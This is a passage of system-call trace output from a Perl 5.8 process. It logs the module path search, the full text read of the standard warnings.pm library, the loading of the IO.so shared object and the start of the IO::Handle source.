5352  07:08:43.609455 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.609469 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.609493 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.609531 stat64("/usr/lib/perl5/warnings.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.609548 stat64("/usr/lib/perl5/warnings.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.609575 stat64("/usr/share/perl5/warnings.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.609586 stat64("/usr/share/perl5/warnings.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.609599 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.609611 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.609624 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.609637 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
5352  07:08:43.609657 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.609671 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.609682 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.609700 read(11, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
5352  07:08:43.610114 brk(0x81b6000)    = 0x81b6000
5352  07:08:43.610131 brk(0x81b5000)    = 0x81b5000
5352  07:08:43.610210 read(11, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
5352  07:08:43.610664 read(11, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
5352  07:08:43.611462 read(11, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
5352  07:08:43.611682 read(11, "", 4096) = 0
5352  07:08:43.611710 close(11)         = 0
5352  07:08:43.611861 _llseek(10, 412, [412], SEEK_SET) = 0
5352  07:08:43.611877 _llseek(10, 0, [412], SEEK_CUR) = 0
5352  07:08:43.611887 close(10)         = 0
5352  07:08:43.611927 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
5352  07:08:43.611950 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5352  07:08:43.611977 futex(0xb7f7a070, 0x81 /* FUTEX_??? */, 2147483647) = 0
5352  07:08:43.611992 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 10
5352  07:08:43.612006 read(10, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5352  07:08:43.612221 fstat64(10, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
5352  07:08:43.612248 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 10, 0) = 0xb7f7e000
5352  07:08:43.612261 mmap2(0xb7f82000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 10, 0x3) = 0xb7f82000
5352  07:08:43.612275 close(10)         = 0
5352  07:08:43.612401 stat64("/etc/perl/IO/Handle.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.612417 stat64("/etc/perl/IO/Handle.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.612430 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.612443 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.612457 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.612470 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.612484 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.612496 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.612508 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.612521 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.612534 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.612546 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
5352  07:08:43.612567 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 10
5352  07:08:43.612595 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2efa8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.612628 _llseek(10, 0, [0], SEEK_CUR) = 0
5352  07:08:43.612663 read(10, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here 